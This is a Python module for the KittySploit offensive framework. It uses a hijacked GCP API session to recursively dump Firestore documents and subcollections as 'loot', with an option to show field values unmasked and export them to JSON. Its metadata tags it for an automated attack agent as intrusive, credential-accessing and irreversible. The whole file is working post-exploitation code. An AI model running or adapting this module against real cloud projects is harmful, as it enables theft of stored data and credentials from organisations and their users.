#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Firestore Recursive Dump Loot",
        "description": "Recursively dump Firestore documents and nested subcollections from the default database",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "firestore", "firebase", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 20,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    collection_id = OptString("", "Root collection ID; empty starts from all top-level collections", False)
    max_depth = OptInteger(3, "Maximum subcollection recursion depth", False)
    max_documents = OptInteger(100, "Maximum total documents to dump", False)
    max_collections = OptInteger(30, "Maximum collections/subcollections to visit", False)
    mask_values = OptBool(True, "Mask document field values in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            print_info(
                f"Recursively dumping Firestore documents "
                f"(depth={int(self.max_depth or 3)}, max_docs={int(self.max_documents or 100)})..."
            )
            documents = self._gcp_firestore_recursive_dump(
                max_depth=int(self.max_depth or 3),
                max_documents=int(self.max_documents or 100),
                max_collections=int(self.max_collections or 30),
                collection_filter=str(self.collection_id or ""),
            )
            if not documents:
                print_warning("No Firestore documents dumped")
                return self.module_result(success=True, data={"documents": []})

            for doc in documents[:10]:
                print_success(f"  [{doc.get('depth')}] {doc.get('path')} ({len(doc.get('fields') or {})} field(s))")
                if doc.get("fields") and not self.mask_values:
                    print_info(
                        f"    fields: {json.dumps(doc.get('fields'), ensure_ascii=False)[:400]}"
                    )
                elif doc.get("fields"):
                    print_info(
                        f"    fields: {self._gcp_mask_value(json.dumps(doc.get('fields'), ensure_ascii=False))}"
                    )
            if len(documents) > 10:
                print_info(f"  ... and {len(documents) - 10} more document(s)")

            payload = {"project_id": project_id, "document_count": len(documents), "documents": documents}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Dumped {len(documents)} document(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Firestore recursive dump failed: {exc}")
            return False
